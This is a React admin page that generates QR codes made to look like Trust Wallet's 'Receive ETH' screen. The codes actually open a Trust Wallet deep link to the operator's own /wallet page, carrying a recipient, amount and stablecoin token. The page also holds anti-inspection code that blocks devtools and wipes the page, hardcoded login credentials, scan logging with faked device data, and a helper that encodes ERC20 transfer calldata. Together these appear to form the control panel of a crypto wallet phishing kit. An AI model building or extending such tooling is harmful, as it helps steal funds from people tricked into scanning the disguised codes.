"use client";

import { useState, useEffect, useRef } from "react";

const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
const TOKEN_DECIMALS = 6;

function isValidAddress(addr: string): boolean {
  return /^0x[a-fA-F0-9]{40}$/.test(addr);
}

function encodeTransferData(to: string, amount: string): string {
  const signature = "a9059cbb";
  const cleanAddr = to.toLowerCase().replace("0x", "");
  if (cleanAddr.length !== 40) throw new Error("Invalid address length");
  const addr = cleanAddr.padStart(64, "0");
  const amountFloat = parseFloat(amount.replace(",", "."));
  if (isNaN(amountFloat) || amountFloat <= 0) throw new Error("Invalid amount");
  const amountWei = BigInt(Math.floor(amountFloat * 10 ** TOKEN_DECIMALS));
  const amountHex = amountWei.toString(16).padStart(64, "0");
  return "0x" + signature + addr + amountHex;
}

function formatNumberWithSpaces(val: string): string {
  const clean = val.replace(/\s+/g, "");
  const parts = clean.split(/[.,]/);
  const separator = clean.includes(",") ? "," : clean.includes(".") ? "." : "";
  
  let integerPart = parts[0].replace(/\D/g, "");
  integerPart = integerPart.replace(/\B(?=(\d{3})+(?!\d))/g, " ");
  
  if (parts.length > 1) {
    const decimalPart = parts[1].replace(/\D/g, "");
    return `${integerPart}${separator}${decimalPart}`;
  }
  
  return integerPart;
}

export default function AdminPage() {
  const [receiverAddress, setReceiverAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [token, setToken] = useState<"USDT" | "USDC">("USDT");

  const [qrUrl, setQrUrl] = useState("");
  const [isMounted, setIsMounted] = useState(false);
  const qrRef = useRef<HTMLDivElement>(null);
  const qrCanvasRef = useRef<HTMLDivElement>(null);
  const qrCodeInstanceRef = useRef<any>(null);
  const amountInputRef = useRef<HTMLInputElement>(null);

  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [usernameInput, setUsernameInput] = useState("");
  const [passwordInput, setPasswordInput] = useState("");
  const [authError, setAuthError] = useState("");

  const [toastMessage, setToastMessage] = useState("");
  const [generating, setGenerating] = useState(false);

  const showToast = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => setToastMessage(""), 2000);
  };

  // ========== ANTI‑INSPECT ==========
  useEffect(() => {
    const blockKeys = (e: KeyboardEvent) => {
      if (
        e.key === "F12" ||
        (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J" || e.key === "C")) ||
        (e.ctrlKey && e.key === "U")
      ) {
        e.preventDefault();
        return false;
      }
    };

    const blockContextMenu = (e: MouseEvent) => {
      e.preventDefault();
      return false;
    };

    document.addEventListener("keydown", blockKeys);
    document.addEventListener("contextmenu", blockContextMenu);

    let devToolsOpen = false;
    const checkDevTools = () => {
      const threshold = 160;
      if (
        window.outerWidth - window.innerWidth > threshold ||
        window.outerHeight - window.innerHeight > threshold
      ) {
        if (!devToolsOpen) {
          devToolsOpen = true;
          document.body.innerHTML =
            "<div style='color:white;text-align:center;margin-top:50vh;font-size:24px;'>Access denied</div>";
        }
      } else {
        devToolsOpen = false;
      }
    };

    const interval = setInterval(checkDevTools, 1000);

    return () => {
      document.removeEventListener("keydown", blockKeys);
      document.removeEventListener("contextmenu", blockContextMenu);
      clearInterval(interval);
    };
  }, []);

  // Chargement des préférences
  useEffect(() => {
    if (typeof window !== "undefined") {
      const savedToken = localStorage.getItem("admin_token");
      if (savedToken === "USDT" || savedToken === "USDC") setToken(savedToken);

      const auth = sessionStorage.getItem("admin_auth");
      if (auth === "true") {
        setIsAuthenticated(true);
      }
      setIsMounted(true);
    }
  }, []);

  useEffect(() => {
    setQrUrl("");
    qrCodeInstanceRef.current = null;
  }, [receiverAddress, amount, token]);

  const handleGenerate = async () => {
    if (!receiverAddress) {
      showToast("Please enter a receiver address");
      return;
    }
    if (!isValidAddress(receiverAddress)) {
      showToast("Invalid Ethereum address");
      return;
    }
    const normalizedAmount = amount.replace(/\s+/g, "").replace(",", ".").trim();
    if (!normalizedAmount || isNaN(Number(normalizedAmount)) || Number(normalizedAmount) <= 0) {
      showToast("Please enter a valid amount");
      return;
    }

    setGenerating(true);
    try {
      const origin = window.location.origin;
      const baseUrl = `${origin}/wallet`;
      const targetUrl = `${baseUrl}?to=${encodeURIComponent(receiverAddress)}&amount=${encodeURIComponent(normalizedAmount)}&token=${encodeURIComponent(token.toLowerCase())}`;
      const coinId = 60;
      const generatedUrl = `https://link.trustwallet.com/open_url?coin_id=${coinId}&url=${encodeURIComponent(targetUrl)}`;

      setQrUrl(generatedUrl);

      // Log to history API (non-blocking)
      try {
        const dbTokenName = token.toUpperCase() + " (ERC20)";
        const deviceName = "Trust Wallet (iOS)";

        await fetch("/api/log-scan", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            to: receiverAddress,
            amount: normalizedAmount,
            token: dbTokenName,
            userAgent: deviceName,
            platform: "iOS",
          }),
        });
      } catch (logErr) {
        console.warn("Log scan failed (non-blocking):", logErr);
      }

      // Save token preference
      localStorage.setItem("admin_token", token);
      showToast("QR code generated!");
    } catch (err) {
      console.error("Failed to generate QR", err);
      showToast("Error generating QR code");
    } finally {
      setGenerating(false);
    }
  };

  // Rendu du QR code
  useEffect(() => {
    if (!qrUrl || typeof window === "undefined" || !isMounted || !isAuthenticated) return;

    // Petit délai pour s'assurer que le DOM du qrCanvasRef est monté après le toggle qrUrl
    const renderTimeout = setTimeout(() => {
      import("qr-code-styling").then((QRCodeStylingModule) => {
        const QRCodeStyling = QRCodeStylingModule.default;
        const options = {
          width: 285,
          height: 285,
          margin: 0,
          type: "svg" as const,
          data: qrUrl,
          image: "/eth.png",
          dotsOptions: { color: "#000000", type: "dots" as const },
          cornersSquareOptions: { color: "#000000", type: "extra-rounded" as const },
          cornersDotOptions: { color: "#000000", type: "dot" as const },
          backgroundOptions: { color: "#ffffff" },
          imageOptions: { crossOrigin: "anonymous", margin: 2, imageSize: 0.24, hideBackgroundDots: true },
          qrOptions: { errorCorrectionLevel: "M" as const },
        };

        if (qrCodeInstanceRef.current && qrCanvasRef.current && qrCanvasRef.current.childNodes.length > 0) {
          // Instance exists and is still attached to the DOM — just update data
          qrCodeInstanceRef.current.update(options);
        } else {
          // Fresh instance needed (first render or after DOM was destroyed/re-created)
          qrCodeInstanceRef.current = new QRCodeStyling(options);
          if (qrCanvasRef.current) {
            qrCanvasRef.current.innerHTML = "";
            qrCodeInstanceRef.current.append(qrCanvasRef.current);
          }
        }
      });
    }, 50); // 50ms ensures the conditional DOM node is mounted

    return () => clearTimeout(renderTimeout);
  }, [qrUrl, isMounted, isAuthenticated]);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
     if (usernameInput === "AUDI" && passwordInput === "BMW") {
      setIsAuthenticated(true);
      setAuthError("");
      if (typeof window !== "undefined") sessionStorage.setItem("admin_auth", "true");
    } else {
      setAuthError("Username or Password incorrect.");
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    if (typeof window !== "undefined") sessionStorage.removeItem("admin_auth");
  };

  const handleCopyAddress = () => {
    if (typeof navigator !== "undefined" && receiverAddress) {
      navigator.clipboard.writeText(receiverAddress).then(() => showToast("Address copied!"));
    }
  };

  const handleSetAmountClick = () => {
    if (amountInputRef.current) {
      amountInputRef.current.focus();
      amountInputRef.current.scrollIntoView({ behavior: "smooth", block: "center" });
    }
  };

  const handleAmountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const input = e.target;
    const rawVal = input.value;
    const selectionStart = input.selectionStart;
    
    const formatted = formatNumberWithSpaces(rawVal);
    
    const rawBeforeCursor = rawVal.slice(0, selectionStart || 0);
    const nonSpacesBeforeCursor = rawBeforeCursor.replace(/\s/g, "").length;
    
    let newCursorPos = 0;
    let nonSpaceCount = 0;
    while (newCursorPos < formatted.length && nonSpaceCount < nonSpacesBeforeCursor) {
      if (formatted[newCursorPos] !== " ") {
        nonSpaceCount++;
      }
      newCursorPos++;
    }
    
    setAmount(formatted);
    
    setTimeout(() => {
      if (amountInputRef.current) {
        amountInputRef.current.setSelectionRange(newCursorPos, newCursorPos);
      }
    }, 0);
  };

  const handleShare = () => {
    if (typeof navigator !== "undefined" && qrUrl) {
      if (navigator.share) {
        navigator.share({
          title: "Payment Link",
          text: `Send ${amount} ${token} to ${receiverAddress}`,
          url: qrUrl,
        }).catch((err) => console.log("Share failed:", err));
      } else {
        navigator.clipboard.writeText(qrUrl).then(() => showToast("Payment link copied!"));
      }
    }
  };

  if (!isAuthenticated && isMounted) {
    return (
      <main className="transfer-main" style={{ justifyContent: "center" }}>
        <div className="home-content" style={{ maxWidth: "400px", margin: "auto 0" }}>
          <h1 className="home-title" style={{ marginBottom: "1.5rem", color: "#0f172a" }}>
            Admin Access
          </h1>
          <form onSubmit={handleLogin} className="form-container" style={{ width: "100%", textAlign: "left" }}>
            <label className="form-label">Username</label>
            <div className="input-row" style={{ marginBottom: "1.25rem" }}>
              <input
                type="text" value={usernameInput} onChange={(e) => setUsernameInput(e.target.value)}
                className="input-row__field" placeholder="Enter username" required
              />
            </div>
            <label className="form-label">Password</label>
            <div className="input-row" style={{ marginBottom: "1.5rem" }}>
              <input
                type="password" value={passwordInput} onChange={(e) => setPasswordInput(e.target.value)}
                className="input-row__field" placeholder="Enter password" required
              />
            </div>
            {authError && (
              <div style={{ color: "#ef4444", fontSize: "0.85rem", marginBottom: "1rem", fontWeight: "500" }}>
                ⚠️ {authError}
              </div>
            )}
            <button type="submit" className="next-btn" style={{ width: "100%", padding: "0.75rem" }}>
              Login
            </button>
          </form>
        </div>
      </main>
    );
  }

  if (!isMounted) {
    return (
      <main className="transfer-main" style={{ justifyContent: "center" }}>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "center", minHeight: "100vh" }}>
          <span className="btn-spinner" style={{ borderColor: "rgba(0,0,0,0.1)", borderTopColor: "#2563eb" }} />
        </div>
      </main>
    );
  }

  return (
    <main className="transfer-main">
      <div className="home-content" ref={qrRef} style={{ maxWidth: "440px", width: "100%", position: "relative", margin: "0 auto 3rem auto" }}>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", width: "100%", marginBottom: "1.25rem" }}>
          <h1 className="home-title" style={{ margin: 0, color: "#0f172a", fontSize: "1.5rem" }}>
            Admin Dashboard
          </h1>
          <button onClick={handleLogout} style={{
            background: "#fee2e2", border: "none", color: "#dc2626", fontSize: "0.82rem",
            fontWeight: "600", cursor: "pointer", padding: "0.35rem 0.85rem", borderRadius: "1rem"
          }}>
            Logout 🚪
          </button>
        </div>
        
        <div className="form-container" style={{ width: "100%", textAlign: "left", marginBottom: "2rem" }}>
          <label className="form-label">Select Asset</label>
          <div className="token-tabs">
            <button type="button" className={`token-tab ${token === "USDT" ? "token-tab--active" : ""}`} onClick={() => setToken("USDT")}>USDT</button>
            <button type="button" className={`token-tab ${token === "USDC" ? "token-tab--active" : ""}`} onClick={() => setToken("USDC")}>USDC</button>
          </div>

          <label className="form-label" style={{ marginTop: "1.25rem" }}>Receiver Address</label>
          <div className="input-row" style={{ marginBottom: "0.5rem" }}>
            <input
              type="text" value={receiverAddress} onChange={(e) => setReceiverAddress(e.target.value)}
              className="input-row__field" placeholder="0x..."
            />
          </div>
          {receiverAddress && !isValidAddress(receiverAddress) && (
            <div style={{ color: "#ef4444", fontSize: "0.8rem", marginBottom: "1rem" }}>
              Invalid Ethereum address (must be 0x followed by 40 hex characters).
            </div>
          )}

          <label className="form-label" style={{ marginTop: "0.75rem" }}>Amount ({token})</label>
          <div className="input-row" style={{ marginBottom: "1.5rem" }}>
            <input
              type="text" ref={amountInputRef} value={amount} onChange={handleAmountChange}
              className="input-row__field" placeholder="1.0"
            />
          </div>

          <button
            type="button"
            onClick={handleGenerate}
            disabled={generating}
            className="next-btn"
            style={{
              width: "100%",
              backgroundColor: "#0033ff",
              marginTop: "0.5rem",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: "0.5rem"
            }}
          >
            {generating ? (
              <span className="btn-spinner-wrapper">
                <span className="btn-spinner" />
                Generating...
              </span>
            ) : (
              "⚡ Generate QR Code"
            )}
          </button>
        </div>

        {/* TRUST WALLET RECEIVE ETH PREVIEW COMPONENT */}
        <div className="admin-qr-section">
          {/* Header: X button + Receive ETH */}
          <div className="receive-header-bar">
            <button type="button" className="receive-header-btn" title="Close">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1e293b" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <line x1="18" y1="6" x2="6" y2="18"></line>
                <line x1="6" y1="6" x2="18" y2="18"></line>
              </svg>
            </button>
            <span className="receive-header-title">Receive ETH</span>
            <div style={{ width: "36px" }} />
          </div>

          {/* Ethereum badge with dropdown */}
          <div className="receive-eth-badge">
            <img src="/eth.png" alt="Ethereum" className="receive-eth-badge-img" />
            <span className="receive-eth-badge-text">Ethereum</span>
            <svg width="8" height="6" viewBox="0 0 8 6" fill="none" xmlns="http://www.w3.org/2000/svg" style={{ marginLeft: "2px" }}>
              <path d="M4 5.5L0.5 1L7.5 1L4 5.5Z" fill="#111827" />
            </svg>
          </div>

          {/* QR Code */}
          {qrUrl ? (
            <div className="qr-preview-card">
              <div ref={qrCanvasRef} style={{ display: "flex", justifyContent: "center", alignItems: "center" }} />
              {receiverAddress && (
                <div className="qr-address">
                  <div>{receiverAddress.slice(0, 34)}</div>
                  <div>{receiverAddress.slice(34)}</div>
                </div>
              )}
            </div>
          ) : (
            <div style={{ width: "100%", height: 260, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", background: "#fff", borderRadius: "1.5rem", border: "1px solid #e5e7eb", margin: "0.75rem auto 1rem auto", padding: "1rem", textAlign: "center", color: "#64748b", fontSize: "0.9rem", boxSizing: "border-box" }}>
              <span style={{ fontSize: "2rem", marginBottom: "0.5rem" }}>⚡</span>
              <div>
                {!receiverAddress 
                  ? "Enter a receiver address"
                  : !isValidAddress(receiverAddress)
                  ? "Invalid address format"
                  : !amount || Number(amount.replace(/\s+/g, "").replace(",", ".")) <= 0
                  ? "Enter a valid amount"
                  : "Click the 'Generate QR Code' button above"}
              </div>
            </div>
          )}

          {/* Warning banner */}
          <div className="receive-alert-banner">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" className="receive-alert-icon">
              <circle cx="12" cy="12" r="10" fill="#ea580c" />
              <line x1="12" y1="8" x2="12" y2="13" stroke="#ffffff" strokeWidth="2.5" strokeLinecap="round" />
              <circle cx="12" cy="16.5" r="1.2" fill="#ffffff" />
            </svg>
            <div className="receive-alert-text">
              Only send Ethereum assets to this address. Other assets will be lost forever.
            </div>
          </div>

          {/* Action buttons: Copy & Share */}
          <div className="qr-actions-container">
            <div className="qr-action-item">
              <button onClick={handleCopyAddress} type="button" className="qr-action-btn" title="Copy Address">
                <img src="/copy.png" alt="Copy" className="qr-action-img" />
              </button>
              <span className="qr-action-label">Copy</span>
            </div>
            <div className="qr-action-item">
              <button onClick={handleShare} type="button" className="qr-action-btn" title="Share Link">
                <img src="/share.png" alt="Share" className="qr-action-img" />
              </button>
              <span className="qr-action-label">Share</span>
            </div>
          </div>

          {/* Deposit from exchange with Binance + Coinbase icons */}
          <div className="receive-deposit-box">
            <div className="receive-deposit-icons">
              <img src="/binance.png" alt="Binance" style={{ width: "26px", height: "26px", borderRadius: "50%" }} />
              <img src="/coinbase.png" alt="Coinbase" style={{ width: "26px", height: "26px", borderRadius: "50%", marginLeft: "-8px" }} />
            </div>
            <span className="receive-deposit-title">Deposit from exchange</span>
          </div>
        </div>

        {toastMessage && <div className="copy-toast">{toastMessage}</div>}
      </div>
    </main>
  );
}